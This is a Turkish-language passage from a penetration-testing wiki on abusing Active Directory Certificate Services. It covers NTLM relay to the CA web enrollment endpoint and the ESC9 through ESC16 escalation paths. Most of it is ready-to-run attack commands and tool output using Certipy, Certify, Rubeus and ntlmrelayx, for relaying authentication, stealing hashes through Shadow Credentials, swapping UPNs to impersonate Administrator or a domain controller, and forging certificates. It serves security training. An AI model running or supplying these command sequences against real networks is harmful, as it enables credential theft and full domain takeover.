<figure><img src="../../../images/image (757).png" alt=""><figcaption></figcaption></figure>
```bash
Import-Module PSPKI
Get-CertificationAuthority | select Name,Enroll* | Format-List *
```
<figure><img src="../../../images/image (940).png" alt=""><figcaption></figcaption></figure>

#### Certify ile kötüye kullanım
```bash
## In the victim machine
# Prepare to send traffic to the compromised machine 445 port to 445 in the attackers machine
PortBender redirect 445 8445
rportfwd 8445 127.0.0.1 445
# Prepare a proxy that the attacker can use
socks 1080

## In the attackers
proxychains ntlmrelayx.py -t http://<AC Server IP>/certsrv/certfnsh.asp -smb2support --adcs --no-http-server

# Force authentication from victim to compromised machine with port forwards
execute-assembly C:\SpoolSample\SpoolSample\bin\Debug\SpoolSample.exe <victim> <compromised>
```
#### [Certipy](https://github.com/ly4k/Certipy) ile kötüye kullanım

Sertifika isteği, Certipy tarafından varsayılan olarak, iletilen hesap adının `$` ile bitip bitmediğine göre `Machine` veya `User` şablonuna dayanarak yapılır. Alternatif bir şablon belirtilmesi `-template` parametresinin kullanımıyla sağlanabilir.

Bunun ardından doğrulamayı zorlamak için [PetitPotam](https://github.com/ly4k/PetitPotam) gibi bir teknik kullanılabilir. Domain controller'larla çalışılırken `-template DomainController` belirtilmesi gerekir.
```bash
certipy relay -ca ca.corp.local
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Targeting http://ca.corp.local/certsrv/certfnsh.asp
[*] Listening on 0.0.0.0:445
[*] Requesting certificate for 'CORP\\Administrator' based on the template 'User'
[*] Got certificate with UPN 'Administrator@corp.local'
[*] Certificate object SID is 'S-1-5-21-980154951-4172460254-2779440654-500'
[*] Saved certificate and private key to 'administrator.pfx'
[*] Exiting...
```
## No Security Extension - ESC9 <a href="#id-5485" id="id-5485"></a>

### Explanation

Yeni değer **`CT_FLAG_NO_SECURITY_EXTENSION`** (`0x80000`) için **`msPKI-Enrollment-Flag`**, ESC9 olarak adlandırılır ve bir sertifikaya **yeni `szOID_NTDS_CA_SECURITY_EXT` security extension**'ın gömülmesini engeller. Bu bayrak, `StrongCertificateBindingEnforcement` `1` olarak ayarlandığında (varsayılan) önem kazanır; bu durum `2` ile olan ayarla çelişir. Daha zayıf bir sertifika eşlemesinin Kerberos veya Schannel için istismar edilebileceği senaryolarda (ESC10'dakine benzer) bu bayrağın önemi artar; çünkü ESC9 yokluğunda gereksinimler değişmeyecektir.

Bu bayrağın ayarının anlamlı hale geldiği koşullar şunlardır:

- `StrongCertificateBindingEnforcement` `2` olarak ayarlanmamış (varsayılan `1`) veya `CertificateMappingMethods` içinde `UPN` bayrağı bulunuyor.
- Sertifika `msPKI-Enrollment-Flag` ayarında `CT_FLAG_NO_SECURITY_EXTENSION` bayrağı ile işaretlenmiş.
- Sertifika herhangi bir client authentication EKU'su belirtiyor.
- Başka bir hesabı ele geçirmek için herhangi bir hesap üzerinde `GenericWrite` izinleri mevcut.

### Abuse Scenario

Farz edelim `John@corp.local`, `Jane@corp.local` üzerinde `GenericWrite` izinlerine sahip ve hedefi `Administrator@corp.local` hesabını ele geçirmek. `Jane@corp.local`'ın enroll olmaya izinli olduğu `ESC9` sertifika şablonu, `msPKI-Enrollment-Flag` ayarında `CT_FLAG_NO_SECURITY_EXTENSION` bayrağıyla yapılandırılmıştır.

Başlangıçta, `John`'un `GenericWrite` sayesinde `Jane`'in hash'i Shadow Credentials kullanılarak elde edilir:
```bash
certipy shadow auto -username John@corp.local -password Passw0rd! -account Jane
```
Daha sonra, `Jane`'in `userPrincipalName`'ı kasıtlı olarak `@corp.local` alan adı kısmı atlanarak `Administrator` olarak değiştirilir:
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Administrator
```
Bu değişiklik, `Administrator@corp.local`'un `Administrator`'ın `userPrincipalName`'ı olarak ayrı kalması koşuluyla kısıtlamaları ihlal etmez.

Bunun ardından, zafiyetli olarak işaretlenen `ESC9` sertifika şablonu, `Jane` olarak istenir:
```bash
certipy req -username jane@corp.local -hashes <hash> -ca corp-DC-CA -template ESC9
```
Sertifikadaki `userPrincipalName`'in `Administrator`'ı yansıttığı ve herhangi bir “object SID” içermediği not edilir.

`Jane`'in `userPrincipalName` daha sonra orijinaline, `Jane@corp.local`'a geri döndürülür:
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Jane@corp.local
```
İhraç edilen sertifika ile yapılan kimlik doğrulaması denemesi artık `Administrator@corp.local` hesabının NT hash'ini veriyor. Sertifika domain belirtmediği için komutun `-domain <domain>` içermesi gerekiyor:
```bash
certipy auth -pfx adminitrator.pfx -domain corp.local
```
## Zayıf Sertifika Eşlemeleri - ESC10

### Açıklama

ESC10, etki alanı denetleyicisindeki iki kayıt defteri anahtar değerine atıfta bulunur:

- `HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\SecurityProviders\Schannel` altında `CertificateMappingMethods` için varsayılan değer `0x18` (`0x8 | 0x10`), önceden `0x1F` olarak ayarlanmıştı.
- `HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Kdc` altında `StrongCertificateBindingEnforcement` için varsayılan ayar `1`, önceden `0` idi.

**Durum 1**

`StrongCertificateBindingEnforcement` `0` olarak yapılandırıldığında.

**Durum 2**

`CertificateMappingMethods` `UPN` bitini (`0x4`) içeriyorsa.

### Kötüye Kullanım Durumu 1

`StrongCertificateBindingEnforcement` `0` olarak yapılandırıldığında, `GenericWrite` izinlerine sahip bir hesap A, herhangi bir hesap B'yi ele geçirmek için suistimal edilebilir.

Örneğin, `Jane@corp.local` üzerinde `GenericWrite` izinlerine sahip olan bir saldırganın amacı `Administrator@corp.local`'ı ele geçirmek olabilir. Prosedür ESC9 ile aynıdır ve herhangi bir certificate template'in kullanılmasına izin verir.

İlk olarak, `GenericWrite`'ı suistimal ederek Shadow Credentials kullanılarak Jane'in hash'i elde edilir.
```bash
certipy shadow autho -username John@corp.local -p Passw0rd! -a Jane
```
Ardından `Jane`'in `userPrincipalName` değeri, bir kısıtlama ihlalini önlemek için `@corp.local` kısmı kasıtlı olarak atlanarak `Administrator` olarak değiştirilir.
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Administrator
```
Bunun ardından, varsayılan `User` şablonu kullanılarak `Jane` olarak istemci kimlik doğrulamasına izin veren bir sertifika talep edilir.
```bash
certipy req -ca 'corp-DC-CA' -username Jane@corp.local -hashes <hash>
```
`Jane`'in `userPrincipalName` daha sonra orijinaline, `Jane@corp.local`, geri döndürülür.
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Jane@corp.local
```
Elde edilen sertifika ile kimlik doğrulaması, `Administrator@corp.local`'in NT hash'ini verecek; sertifikada domain bilgisi bulunmadığı için komutta domain'in belirtilmesi gerekir.
```bash
certipy auth -pfx administrator.pfx -domain corp.local
```
### Kötüye Kullanım Durumu 2

`CertificateMappingMethods` içinde `UPN` bit bayrağı (`0x4`) bulunduğunda, `GenericWrite` izinlerine sahip bir A hesabı, `userPrincipalName` özelliğine sahip olmayan herhangi bir B hesabını (makine hesapları ve yerleşik domain yöneticisi `Administrator` dahil) ele geçirebilir.

Burada amaç, `GenericWrite`'i kullanarak Shadow Credentials aracılığıyla `Jane`'in hash'ini elde etmekle başlayıp `DC$@corp.local`'ı ele geçirmek.
```bash
certipy shadow auto -username John@corp.local -p Passw0rd! -account Jane
```
`Jane`'in `userPrincipalName` daha sonra `DC$@corp.local` olarak ayarlanır.
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn 'DC$@corp.local'
```
İstemci kimlik doğrulaması için bir sertifika, varsayılan `User` şablonu kullanılarak `Jane` olarak talep edilir.
```bash
certipy req -ca 'corp-DC-CA' -username Jane@corp.local -hashes <hash>
```
`Jane`'in `userPrincipalName` bu işlemden sonra orijinaline geri döner.
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn 'Jane@corp.local'
```
Schannel üzerinden kimlik doğrulaması yapmak için Certipy’nin `-ldap-shell` seçeneği kullanılır; kimlik doğrulama başarısı `u:CORP\DC$` olarak gösterilir.
```bash
certipy auth -pfx dc.pfx -dc-ip 172.16.126.128 -ldap-shell
```
LDAP kabuğu aracılığıyla, `set_rbcd` gibi komutlar Resource-Based Constrained Delegation (RBCD) saldırılarına olanak tanır ve potansiyel olarak etki alanı denetleyicisini tehlikeye atar.
```bash
certipy auth -pfx dc.pfx -dc-ip 172.16.126.128 -ldap-shell
```
This vulnerability also extends to any user account lacking a `userPrincipalName` or where it does not match the `sAMAccountName`, with the default `Administrator@corp.local` being a prime target due to its elevated LDAP privileges and the absence of a `userPrincipalName` by default.

## Relaying NTLM to ICPR - ESC11

### Açıklama

If CA Server Do not configured with `IF_ENFORCEENCRYPTICERTREQUEST`, it can be makes NTLM relay attacks without signing via RPC service. [Reference in here](https://blog.compass-security.com/2022/11/relaying-to-ad-certificate-services-over-rpc/).

`certipy` ile `Enforce Encryption for Requests`'ın Disabled (devre dışı) olup olmadığını sayımlayabilirsiniz; certipy `ESC11` Vulnerabilities'i gösterecektir.
```bash
$ certipy find -u mane@domain.local -p 'password' -dc-ip 192.168.100.100 -stdout
Certipy v4.0.0 - by Oliver Lyak (ly4k)

Certificate Authorities
0
CA Name                             : DC01-CA
DNS Name                            : DC01.domain.local
Certificate Subject                 : CN=DC01-CA, DC=domain, DC=local
....
Enforce Encryption for Requests     : Disabled
....
[!] Vulnerabilities
ESC11                             : Encryption is not enforced for ICPR requests and Request Disposition is set to Issue

```
### Kötüye Kullanım Senaryosu

Relay server kurması gerekir:
```bash
$ certipy relay -target 'rpc://DC01.domain.local' -ca 'DC01-CA' -dc-ip 192.168.100.100
Certipy v4.7.0 - by Oliver Lyak (ly4k)

[*] Targeting rpc://DC01.domain.local (ESC11)
[*] Listening on 0.0.0.0:445
[*] Connecting to ncacn_ip_tcp:DC01.domain.local[135] to determine ICPR stringbinding
[*] Attacking user 'Administrator@DOMAIN'
[*] Template was not defined. Defaulting to Machine/User
[*] Requesting certificate for user 'Administrator' with template 'User'
[*] Requesting certificate via RPC
[*] Successfully requested certificate
[*] Request ID is 10
[*] Got certificate with UPN 'Administrator@domain.local'
[*] Certificate object SID is 'S-1-5-21-1597581903-3066826612-568686062-500'
[*] Saved certificate and private key to 'administrator.pfx'
[*] Exiting...
```
Not: Domain denetleyicileri için, DomainController içinde `-template` belirtmemiz gerekiyor.

Veya [sploutchy's fork of impacket](https://github.com/sploutchy/impacket) :
```bash
$ ntlmrelayx.py -t rpc://192.168.100.100 -rpc-mode ICPR -icpr-ca-name DC01-CA -smb2support
```
## Shell access to ADCS CA with YubiHSM - ESC12

### Açıklama

Yöneticiler, Sertifika Yetkilisi'ni (Certificate Authority) Yubico YubiHSM2 gibi bir harici cihaza depolamak üzere yapılandırabilirler.

CA sunucusuna USB portu aracılığıyla bağlı bir USB cihazı varsa, veya CA sunucusu bir virtual machine ise bir USB device server kullanılıyorsa, Key Storage Provider'ın YubiHSM içinde anahtar üretmek ve kullanmak için bir kimlik doğrulama anahtarına (bazı durumlarda "password" olarak adlandırılır) ihtiyacı vardır.

Bu anahtar/password, kayıt defterinde `HKEY_LOCAL_MACHINE\SOFTWARE\Yubico\YubiHSM\AuthKeysetPassword` altında açık metin (cleartext) olarak saklanır.

Referans: [here](https://pkiblog.knobloch.info/esc12-shell-access-to-adcs-ca-with-yubihsm).

### Kötüye Kullanım Senaryosu

Eğer CA'nın özel anahtarı fiziksel bir USB cihazında saklanıyorsa ve sizde shell erişimi varsa, anahtarı kurtarmak mümkün olabilir.

İlk olarak, CA sertifikasını edinmeniz gerekir (bu herkese açıktır) ve sonra:
```cmd
# import it to the user store with CA certificate
$ certutil -addstore -user my <CA certificate file>

# Associated with the private key in the YubiHSM2 device
$ certutil -csp "YubiHSM Key Storage Provider" -repairstore -user my <CA Common Name>
```
Son olarak, CA sertifikası ve özel anahtarını kullanarak yeni bir sertifika sahtelemek için certutil `-sign` komutunu kullanın.

## OID Group Link Abuse - ESC13

### Explanation

`msPKI-Certificate-Policy` özniteliği, sertifika şablonuna sertifika verme politikasının eklenmesini sağlar. Politika verme işlemlerinden sorumlu `msPKI-Enterprise-Oid` nesneleri, PKI OID konteynerinin Configuration Naming Context (CN=OID,CN=Public Key Services,CN=Services) içinde keşfedilebilir. Bir politika, bu nesnenin `msDS-OIDToGroupLink` özniteliği kullanılarak bir AD grubuna bağlanabilir; böylece sistem sertifikayı sunan kullanıcıyı sanki grubun üyesiymiş gibi yetkilendirebilir. [Reference in here](https://posts.specterops.io/adcs-esc13-abuse-technique-fda4272fbd53).

Başka bir deyişle, bir kullanıcının sertifika kaydetme izni varsa ve sertifika bir OID grubuna bağlıysa, kullanıcı bu grubun ayrıcalıklarını devralabilir.

Use [Check-ADCSESC13.ps1](https://github.com/JonasBK/Powershell/blob/master/Check-ADCSESC13.ps1) to find OIDToGroupLink:
```bash
Enumerating OIDs
------------------------
OID 23541150.FCB720D24BC82FBD1A33CB406A14094D links to group: CN=VulnerableGroup,CN=Users,DC=domain,DC=local

OID DisplayName: 1.3.6.1.4.1.311.21.8.3025710.4393146.2181807.13924342.9568199.8.4253412.23541150
OID DistinguishedName: CN=23541150.FCB720D24BC82FBD1A33CB406A14094D,CN=OID,CN=Public Key Services,CN=Services,CN=Configuration,DC=domain,DC=local
OID msPKI-Cert-Template-OID: 1.3.6.1.4.1.311.21.8.3025710.4393146.2181807.13924342.9568199.8.4253412.23541150
OID msDS-OIDToGroupLink: CN=VulnerableGroup,CN=Users,DC=domain,DC=local
------------------------
Enumerating certificate templates
------------------------
Certificate template VulnerableTemplate may be used to obtain membership of CN=VulnerableGroup,CN=Users,DC=domain,DC=local

Certificate template Name: VulnerableTemplate
OID DisplayName: 1.3.6.1.4.1.311.21.8.3025710.4393146.2181807.13924342.9568199.8.4253412.23541150
OID DistinguishedName: CN=23541150.FCB720D24BC82FBD1A33CB406A14094D,CN=OID,CN=Public Key Services,CN=Services,CN=Configuration,DC=domain,DC=local
OID msPKI-Cert-Template-OID: 1.3.6.1.4.1.311.21.8.3025710.4393146.2181807.13924342.9568199.8.4253412.23541150
OID msDS-OIDToGroupLink: CN=VulnerableGroup,CN=Users,DC=domain,DC=local
------------------------
```
### Kötüye Kullanım Senaryosu

Kullanıcının kullanabileceği bir izni bulmak için `certipy find` veya `Certify.exe find /showAllPermissions` kullanın.

Eğer `John`'un `VulnerableTemplate`'a enroll izni varsa, kullanıcı `VulnerableGroup` grubunun ayrıcalıklarını devralabilir.

Yapması gereken tek şey şablonu belirtmek; bu, OIDToGroupLink haklarına sahip bir sertifika almasını sağlar.
```bash
certipy req -u "John@domain.local" -p "password" -dc-ip 192.168.100.100 -target "DC01.domain.local" -ca 'DC01-CA' -template 'VulnerableTemplate'
```
## Zayıf Sertifika Yenileme Yapılandırması- ESC14

### Açıklama

https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation#esc14-weak-explicit-certificate-mapping adresindeki açıklama son derece kapsamlıdır. Aşağıda orijinal metinden bir alıntı bulunmaktadır.

ESC14, esas olarak Active Directory kullanıcı veya bilgisayar hesaplarındaki `altSecurityIdentities` özniteliğinin hatalı veya güvensiz yapılandırılmasından kaynaklanan "zayıf explicit certificate mapping" (zayıf açık sertifika eşlemesi) zafiyetlerini ele alır. Bu çok-değerli öznitelik yöneticilerin bir AD hesabını kimlik doğrulama amacıyla manuel olarak X.509 sertifikalarıyla ilişkilendirmesine izin verir. Doldurulduğunda, bu explicit eşlemeler tipik olarak sertifikanın SAN içindeki UPN'lere veya DNS isimlerine ya da `szOID_NTDS_CA_SECURITY_EXT` güvenlik uzantısına gömülü SID'e dayanan varsayılan sertifika eşleme mantığını geçersiz kılabilir.

"Zayıf" bir eşleme, `altSecurityIdentities` özniteliği içinde bir sertifikayı tanımlamak için kullanılan string değerin çok geniş, kolay tahmin edilebilir, benzersiz olmayan sertifika alanlarına dayanıyor olması veya kolayca taklit edilebilir sertifika bileşenleri kullanması durumunda ortaya çıkar. Bir saldırgan, ayrıcalıklı bir hesap için böyle zayıf tanımlanmış bir explicit eşlemeyle eşleşen bir sertifika elde edebilir veya oluşturabilirse, o sertifikayı hesabın kimliğini doğrulamak ve hesabı taklit etmek için kullanabilir.

Potansiyel olarak zayıf `altSecurityIdentities` eşleme stringlerine örnekler:

- Sadece yaygın bir Subject Common Name (CN) ile eşleme yapmak: örn., `X509:<S>CN=SomeUser`. Bir saldırgan bu CN'ye sahip bir sertifikayı daha az güvenli bir kaynaktan temin edebilir.
- Belirli bir seri numarası veya subject key identifier gibi daha fazla nitelendirme olmaksızın aşırı genel Issuer Distinguished Name (DN) veya Subject DN kullanmak: örn., `X509:<I>CN=SomeInternalCA<S>CN=GenericUser`.
- Bir saldırganın meşru olarak elde edebileceği veya (eğer bir CA'yi ele geçirmişse veya ESC1'de olduğu gibi savunmasız bir şablon bulduysa) sahteleyebileceği diğer tahmin edilebilir kalıpları veya kriptografik olmayan tanımlayıcıları kullanmak.

`altSecurityIdentities` özniteliği aşağıdaki gibi çeşitli eşleme formatlarını destekler:

- `X509:<I>IssuerDN<S>SubjectDN` (tam Issuer ve Subject DN ile eşler)
- `X509:<SKI>SubjectKeyIdentifier` (sertifikanın Subject Key Identifier uzantı değeriyle eşler)
- `X509:<SR>SerialNumberBackedByIssuerDN` (seri numarası ile eşler, dolaylı olarak Issuer DN ile nitelendirilir) - bu standart bir format değildir, genellikle `<I>IssuerDN<SR>SerialNumber` şeklindedir.
- `X509:<RFC822>EmailAddress` (SAN içindeki RFC822 adı, tipik olarak bir e-posta adresi ile eşler)
- `X509:<SHA1-PUKEY>Thumbprint-of-Raw-PublicKey` (sertifikanın ham açık anahtarının SHA1 hash'i ile eşler - genel olarak güçlüdür)

Bu eşlemelerin güvenliği, eşleme stringinde seçilen sertifika tanımlayıcılarının özgüllüğüne, benzersizliğine ve kriptografik gücüne büyük ölçüde bağlıdır. Domain Controller'larda güçlü sertifika bağlama modları etkin olsa bile (bunlar esasen SAN UPN/DNS ve SID uzantısına dayalı implicit eşlemeleri etkiler), kötü yapılandırılmış bir `altSecurityIdentities` girdisi eşleme mantığı kendisi hatalı veya çok izin verici ise doğrudan taklit için bir yol sunabilir.

### Kötüye Kullanım Senaryosu

ESC14, Active Directory (AD) içindeki **explicit certificate mappings**'i, özellikle `altSecurityIdentities` özniteliğini hedef alır. Bu öznitelik ayarlanmışsa (tasarım gereği veya yanlış yapılandırma nedeniyle), saldırganlar eşleşen sertifikaları sunarak hesapları taklit edebilirler.

#### Senaryo A: Saldırgan `altSecurityIdentities` üzerine yazabilir

Önkoşul: Saldırganın hedef hesabın `altSecurityIdentities` özniteliğine yazma izinleri veya hedef AD nesnesi üzerinde aşağıdaki izinlerden biri şeklinde bu izni verebilme yetkisi vardır:
- Write property `altSecurityIdentities`
- Write property `Public-Information`
- Write property (all)
- `WriteDACL`
- `WriteOwner`*
- `GenericWrite`
- `GenericAll`
- Owner*.

#### Senaryo B: Hedefin X509RFC822 (E-posta) üzerinden zayıf eşlemesi var

- Önkoşul: Hedefin altSecurityIdentities içinde zayıf bir X509RFC822 eşlemesi vardır. Bir saldırgan, kurbanın mail özniteliğini hedefin X509RFC822 adına uydurabilir, kurban adına bir sertifika kaydettirebilir ve bu sertifikayı hedef gibi kimlik doğrulamak için kullanabilir.

#### Senaryo C: Hedefin X509IssuerSubject Eşlemesi Var

- Önkoşul: Hedefin `altSecurityIdentities` içinde zayıf bir X509IssuerSubject explicit eşlemesi vardır. Saldırgan, kurban principal'in cn veya dNSHostName özniteliğini hedefin X509IssuerSubject eşlemesinin subject'ına uydurabilir. Ardından, saldırgan kurban adına bir sertifika kaydettirip bu sertifikayı kullanarak hedef olarak kimlik doğrulayabilir.

#### Senaryo D: Hedefin X509SubjectOnly Eşlemesi Var

- Önkoşul: Hedefin `altSecurityIdentities` içinde zayıf bir X509SubjectOnly explicit eşlemesi vardır. Saldırgan, kurban principal'in cn veya dNSHostName özniteliğini hedefin X509SubjectOnly eşlemesinin subject'ına uydurabilir. Ardından, saldırgan kurban adına bir sertifika kaydettirip bu sertifikayı kullanarak hedef olarak kimlik doğrulayabilir.

### Somut işlemler
#### Senaryo A

Sertifika şablonu `Machine` için bir sertifika talep edin.
```bash
.\Certify.exe request /ca:<ca> /template:Machine /machine
```
Sertifikayı kaydet ve dönüştür
```bash
certutil -MergePFX .\esc13.pem .\esc13.pfx
```
Kimlik doğrulama (sertifika kullanarak)
```bash
.\Rubeus.exe asktgt /user:<user> /certificate:C:\esc13.pfx /nowrap
```
Temizlik (isteğe bağlı)
```bash
Remove-AltSecIDMapping -DistinguishedName "CN=TargetUserA,CN=Users,DC=external,DC=local" -MappingString "X509:<I>DC=local,DC=external,CN=external-EXTCA01-CA<SR>250000000000a5e838c6db04f959250000006c"
```
Daha spesifik saldırı yöntemleri ve farklı saldırı senaryoları için lütfen şu kaynağa bakın: [adcs-esc14-abuse-technique](https://posts.specterops.io/adcs-esc14-abuse-technique-333a004dc2b9#aca0).

## EKUwu Uygulama Politikaları (CVE-2024-49019) - ESC15

### Açıklama

https://trustedsec.com/blog/ekuwu-not-just-another-ad-cs-esc adresindeki açıklama son derece ayrıntılıdır. Aşağıda orijinal metinden bir alıntı yer almaktadır.

Dahili varsayılan sürüm 1 sertifika şablonlarını kullanarak, bir saldırgan şablonda belirtilen yapılandırılmış Extended Key Usage özniteliklerine göre daha tercih edilen uygulama politikalarını içerecek şekilde bir CSR hazırlayabilir. Tek gereksinim kayıt (enrollment) haklarıdır ve **_WebServer_** şablonunu kullanarak istemci kimlik doğrulama, sertifika talep aracısı ve kod imzalama sertifikaları oluşturmak için kullanılabilir.

### Kötüye Kullanım

Aşağıdaki referans [this link]((https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation#esc15-arbitrary-application-policy-injection-in-v1-templates-cve-2024-49019-ekuwu),Daha ayrıntılı kullanım yöntemleri için tıklayın.

Certipy'nin `find` komutu, CA yamalanmamışsa ESC15'e potansiyel olarak açık olabilecek V1 şablonlarını tespit etmeye yardımcı olabilir.
```bash
certipy find -username cccc@aaa.htb -password aaaaaa -dc-ip 10.0.0.100
```
#### Senaryo A: Direct Impersonation via Schannel

**Adım 1: Bir sertifika talep edin, "Client Authentication" Application Policy ve hedef UPN'i enjekte ederek.** Saldırgan `attacker@corp.local`, "WebServer" V1 şablonunu (kaydolanın sağladığı subject'e izin veren) kullanarak `administrator@corp.local`'u hedef alır.
```bash
certipy req \
-u 'attacker@corp.local' -p 'Passw0rd!' \
-dc-ip '10.0.0.100' -target 'CA.CORP.LOCAL' \
-ca 'CORP-CA' -template 'WebServer' \
-upn 'administrator@corp.local' -sid 'S-1-5-21-...-500' \
-application-policies 'Client Authentication'
```
- `-template 'WebServer'`: "Enrollee supplies subject" ayarına sahip kırılgan V1 şablonu.
- `-application-policies 'Client Authentication'`: CSR'nin Application Policies uzantısına OID `1.3.6.1.5.5.7.3.2` ekler.
- `-upn 'administrator@corp.local'`: Taklit amaçlı SAN içinde UPN'i ayarlar.

**Adım 2: Elde edilen sertifika ile Schannel (LDAPS) üzerinden kimlik doğrulaması yapın.**
```bash
certipy auth -pfx 'administrator.pfx' -dc-ip '10.0.0.100' -ldap-shell
```
#### Senaryo B: PKINIT/Kerberos Impersonation via Enrollment Agent Abuse

**Adım 1: Request a certificate from a V1 template (with "Enrollee supplies subject"), injecting "Certificate Request Agent" Application Policy.** Bu sertifika, saldırganın (`attacker@corp.local`) enrollment agent olabilmesi içindir. Burada saldırganın kendi kimliği için herhangi bir UPN belirtilmemiştir, çünkü amaç ajan yeteneğidir.
```bash
certipy req \
-u 'attacker@corp.local' -p 'Passw0rd!' \
-dc-ip '10.0.0.100' -target 'CA.CORP.LOCAL' \
-ca 'CORP-CA' -template 'WebServer' \
-application-policies 'Certificate Request Agent'
```
- `-application-policies 'Certificate Request Agent'`: OID `1.3.6.1.4.1.311.20.2.1`'i enjekte eder.

**Adım 2: Hedef ayrıcalıklı kullanıcı adına sertifika istemek için "agent" sertifikasını kullanın.** Bu, Adım 1'deki sertifikayı agent sertifikası olarak kullanan ESC3-benzeri bir adımdır.
```bash
certipy req \
-u 'attacker@corp.local' -p 'Passw0rd!' \
-dc-ip '10.0.0.100' -target 'CA.CORP.LOCAL' \
-ca 'CORP-CA' -template 'User' \
-pfx 'attacker.pfx' -on-behalf-of 'CORP\Administrator'
```
**Adım 3: "on-behalf-of" sertifikasını kullanarak ayrıcalıklı kullanıcı olarak kimlik doğrulayın.**
```bash
certipy auth -pfx 'administrator.pfx' -dc-ip '10.0.0.100'
```
## Security Extension Disabled on CA (Globally)-ESC16

### Açıklama

**ESC16 (Elevation of Privilege via Missing szOID_NTDS_CA_SECURITY_EXT Extension)**, AD CS yapılandırması tüm sertifikalara **szOID_NTDS_CA_SECURITY_EXT** uzantısının eklenmesini zorunlu kılmıyorsa, bir saldırganın bunu suistimal edebileceği durumu ifade eder. Bu suistimal şunları içerir:

1. **SID binding** olmadan bir sertifika talep etmek.

2. Bu sertifikayı herhangi bir hesap olarak kimlik doğrulama için kullanmak; örneğin yüksek ayrıcalıklı bir hesabı (ör. bir Domain Administrator) taklit etmek.

Detaylı prensibi öğrenmek için şu makaleye de bakabilirsiniz: https://medium.com/@muneebnawaz3849/ad-cs-esc16-misconfiguration-and-exploitation-9264e022a8c6

### Kötüye Kullanım

Aşağıdakiler [bu bağlantıya](https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation#esc16-security-extension-disabled-on-ca-globally) dayanmaktadır; daha ayrıntılı kullanım yöntemlerini görmek için tıklayın.

Active Directory Certificate Services (AD CS) ortamının **ESC16**'ya karşı savunmasız olup olmadığını belirlemek için
```bash
certipy find -u 'attacker@corp.local' -p '' -dc-ip 10.0.0.100 -stdout -vulnerable
```
**Adım 1: Kurban hesabının ilk UPN'ini okuyun (İsteğe bağlı - geri yükleme için).
```bash
certipy account \
-u 'attacker@corp.local' -p 'Passw0rd!' \
-dc-ip '10.0.0.100' -user 'victim' \
read
```
**Adım 2: Kurban hesabın UPN'sini hedef yöneticinin `sAMAccountName` değeriyle güncelleyin.**
```bash
certipy account \
-u 'attacker@corp.local' -p 'Passw0rd!' \
-dc-ip '10.0.0.100' -upn 'administrator' \
-user 'victim' update
```
**Adım 3: (Gerekirse) "victim" hesabının kimlik bilgilerini elde edin (ör. Shadow Credentials aracılığıyla).**
```shell
certipy shadow \
-u 'attacker@corp.local' -p 'Passw0rd!' \
-dc-ip '10.0.0.100' -account 'victim' \
auto
```
**Adım 4: ESC16-vulnerable CA üzerinde "victim" kullanıcısı adına _any suitable client authentication template_ (ör. "User") üzerinden bir sertifika talep edin.** CA ESC16'ya karşı savunmasız olduğu için, şablonun bu uzantı için yaptığı özel ayarlara bakılmaksızın verilen sertifikadan SID security extension otomatik olarak çıkarılacaktır. Kerberos credential cache ortam değişkenini ayarlayın (shell komutu):
```bash
export KRB5CCNAME=victim.ccache
```
Sonra sertifikayı isteyin:
```bash
certipy req \
-k -dc-ip '10.0.0.100' \
-target 'CA.CORP.LOCAL' -ca 'CORP-CA' \
-template 'User'
```
**Adım 5: "victim" hesabının UPN'sini eski haline getir.**
```bash
certipy account \
-u 'attacker@corp.local' -p 'Passw0rd!' \
-dc-ip '10.0.0.100' -upn 'victim@corp.local' \
-user 'victim' update
```
**Adım 6: hedef yönetici olarak kimlik doğrulama.**
```bash
certipy auth \
-dc-ip '10.0.0.100' -pfx 'administrator.pfx' \
-username 'administrator' -domain 'corp.local'
```
## Sertifikalarla Ormanların Ele Geçirilmesi (Edilgen Anlatım)

### Ele Geçirilmiş CA'ların Orman Güvenlerini Bozması

Cross-forest enrollment yapılandırması nispeten basittir. Resource forest'tan gelen root CA certificate yöneticiler tarafından account forests'a yayınlanır ve resource forest'tan gelen enterprise CA sertifikaları her account forest'taki `NTAuthCertificates` ve AIA container'larına eklenir. Açıklamak gerekirse, bu düzenleme resource forest'taki CA'ya yönettiği PKI'ya ait tüm diğer forestlar üzerinde tam kontrol sağlar. Bu CA saldırganlar tarafından ele geçirilirse, resource ve account forest'lardaki tüm kullanıcılar için sertifikalar onlar tarafından sahte olarak düzenlenebilir ve böylece forest'un güvenlik sınırı kırılmış olur.

### Yabancı Principal'lere Verilen Enrollment Yetkileri

Çoklu-forest ortamlarında, Enterprise CAs tarafından yayınlanan ve **Authenticated Users veya foreign principals** (Enterprise CA'nın ait olduğu forest'ın dışındaki kullanıcı/gruplar) için **enrollment ve edit hakları** veren certificate templates konusunda dikkatli olunmalıdır.\
Bir trust üzerinden kimlik doğrulaması yapıldığında, **Authenticated Users SID** AD tarafından kullanıcının token'ına eklenir. Bu nedenle, eğer bir domain'in Enterprise CA'sı Authenticated Users enrollment haklarını veren bir template'e sahipse, o template muhtemelen farklı bir forest'tan bir kullanıcı tarafından enroll edilebilir. Benzer şekilde, eğer bir template açıkça bir foreign principal'e enrollment hakları veriyorsa, bu durum bir cross-forest access-control relationship oluşturur ve bir forest'taki bir principal'ın diğer forest'taki bir template'i enroll etmesine izin verir.

Her iki senaryo da bir forest'tan diğerine doğru attack surface'ın artmasına yol açar. Certificate template ayarları bir saldırgan tarafından kullanılarak yabancı bir domain'de ek ayrıcalıklar elde edilebilir.


## References

- [Certify 2.0 – SpecterOps Blog](https://specterops.io/blog/2025/08/11/certify-2-0/)
- [GhostPack/Certify](https://github.com/GhostPack/Certify)
- [GhostPack/Rubeus](https://github.com/GhostPack/Rubeus)

{{#include ../../../banners/hacktricks-training.md}}
